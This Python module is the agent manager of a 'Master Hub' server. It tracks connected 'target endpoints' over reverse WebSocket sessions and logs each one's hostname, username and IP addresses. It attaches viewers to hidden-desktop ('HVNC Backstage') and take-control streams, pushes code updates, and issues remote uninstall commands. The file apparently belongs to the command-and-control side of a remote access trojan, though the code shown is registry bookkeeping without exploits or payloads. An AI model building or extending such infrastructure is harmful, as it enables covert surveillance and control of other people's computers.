"""
Master Hub Agent Manager.
Tracks online/offline endpoints, system telemetry, and coordinates reverse WebSocket sessions.
"""

import time
import json
import logging
from typing import Dict, Any, Optional
from fastapi import WebSocket

logger = logging.getLogger("master_hub.agent_manager")


class ConnectedAgent:
    """Represents a connected target endpoint."""

    def __init__(self, agent_id: str, ws: WebSocket, client_info: Dict[str, Any]):
        self.agent_id = agent_id
        self.ws = ws
        self.client_info = client_info
        self.connected_at = time.time()
        self.last_heartbeat = time.time()
        # HVNC (Backstage) viewers
        self.viewers: Dict[str, WebSocket] = {}
        self.is_streaming_hvnc = False
        # Mirror (Take Control) viewers
        self.mirror_viewers: Dict[str, WebSocket] = {}
        self.is_streaming_mirror = False

    def update_info(self, info: Dict[str, Any]):
        self.client_info.update(info)
        self.last_heartbeat = time.time()

    def to_dict(self) -> Dict[str, Any]:
        from .ota_manager import OTAManager
        server_manifest = OTAManager.get_code_manifest()
        server_hash = server_manifest.get("overall_hash", "")
        agent_hash = self.client_info.get("code_hash", "")
        has_update = bool(server_hash and agent_hash and server_hash != agent_hash)

        return {
            "agent_id": self.agent_id,
            "endpoint_tag": self.client_info.get("endpoint_tag", self.client_info.get("tag", "")),
            "status": "online",
            "hostname": self.client_info.get("hostname", "Unknown"),
            "username": self.client_info.get("username", "Unknown"),
            "os": self.client_info.get("os", "Windows"),
            "arch": self.client_info.get("arch", "x64"),
            "ram_gb": self.client_info.get("ram_gb", 0),
            "cpu": self.client_info.get("cpu", "Unknown"),
            "local_ip": self.client_info.get("local_ip", "127.0.0.1"),
            "public_ip": self.client_info.get("public_ip", ""),
            "connected_at": self.connected_at,
            "last_heartbeat": self.last_heartbeat,
            "is_streaming": self.is_streaming_hvnc,
            "is_mirroring": self.is_streaming_mirror,
            "code_hash": agent_hash,
            "server_hash": server_hash,
            "has_update": has_update,
            "update_version": server_manifest.get("version", "2.8.0-live"),
            "update_description": server_manifest.get("description", "A new OTA update is available.")
        }


class AgentManager:
    """Central registry for all active endpoint connections and active remote sessions."""

    def __init__(self):
        self.active_agents: Dict[str, ConnectedAgent] = {}
        self.registered_agents: Dict[str, Dict[str, Any]] = {}
        self.decommissioned_agents: set = set()

    def register_connection(self, agent_id: str, ws: WebSocket, info: Dict[str, Any]) -> Optional[ConnectedAgent]:
        self.decommissioned_agents.discard(agent_id)

        # If the SAME agent_id reconnects (e.g. after reboot), update existing record in-place.
        # Do NOT replace entries by hostname match — that caused the 'override' bug when a new
        # installer package (with a new UUID) was run on the same machine. With hardware-bound
        # machine IDs (sha256(hostname+MAC)[:8]) this is now handled at the agent level instead.
        if agent_id in self.active_agents:
            existing = self.active_agents[agent_id]
            logger.info(f"Agent '{agent_id}' reconnected. Closing previous WebSocket and updating record.")
            try:
                import asyncio
                asyncio.create_task(existing.ws.close(code=1000, reason="Superseded by reconnect"))
            except Exception:
                pass

        agent = ConnectedAgent(agent_id, ws, info)
        self.active_agents[agent_id] = agent
        self.registered_agents[agent_id] = agent.to_dict()
        logger.info(f"Agent '{agent_id}' ({info.get('hostname')}) registered online.")
        return agent

    def unregister_connection(self, agent_id: str):
        if agent_id in self.active_agents:
            self.active_agents.pop(agent_id)
        if agent_id in self.decommissioned_agents:
            self.registered_agents.pop(agent_id, None)
            logger.info(f"Decommissioned agent '{agent_id}' removed on disconnect.")
            return
        if agent_id in self.registered_agents:
            self.registered_agents[agent_id]["status"] = "offline"
            self.registered_agents[agent_id]["last_heartbeat"] = time.time()
        logger.info(f"Agent '{agent_id}' disconnected.")

    def get_agent(self, agent_id: str) -> Optional[ConnectedAgent]:
        return self.active_agents.get(agent_id)

    def list_all_agents(self) -> list:
        # Returns list of all agents (online and offline, excluding decommissioned)
        results = []
        for aid, data in list(self.registered_agents.items()):
            if aid in self.decommissioned_agents:
                continue
            if aid in self.active_agents:
                results.append(self.active_agents[aid].to_dict())
            else:
                data["status"] = "offline"
                results.append(data)
        return sorted(results, key=lambda x: (x["status"] != "online", -x.get("last_heartbeat", 0)))

    def attach_viewer(self, agent_id: str, viewer_id: str, viewer_ws: WebSocket, mode: str = "backstage") -> bool:
        agent = self.get_agent(agent_id)
        if agent:
            if mode == "mirror":
                agent.mirror_viewers[viewer_id] = viewer_ws
            else:
                agent.viewers[viewer_id] = viewer_ws
            return True
        return False

    def detach_viewer(self, agent_id: str, viewer_id: str, mode: str = "backstage"):
        agent = self.get_agent(agent_id)
        if agent:
            if mode == "mirror":
                agent.mirror_viewers.pop(viewer_id, None)
            else:
                agent.viewers.pop(viewer_id, None)

    def remove_agent(self, agent_id: str) -> bool:
        """Removes an agent from registered and active lists and instructs target process to terminate cleanly."""
        self.decommissioned_agents.add(agent_id)
        if agent_id in self.active_agents:
            agent = self.active_agents.pop(agent_id)
            try:
                import asyncio
                async def terminate_and_close(ws):
                    try:
                        await ws.send_text(json.dumps({
                            "type": "terminate",
                            "reason": "Agent session removed and terminated by administrator",
                            "uninstall": True
                        }))
                        await asyncio.sleep(0.8)
                        await ws.close(code=1000, reason="Terminated by administrator")
                    except Exception:
                        pass
                asyncio.create_task(terminate_and_close(agent.ws))
            except Exception:
                pass
        if agent_id in self.registered_agents:
            self.registered_agents.pop(agent_id, None)
            logger.info(f"Agent '{agent_id}' terminated and removed by administrator.")
            return True
        return False
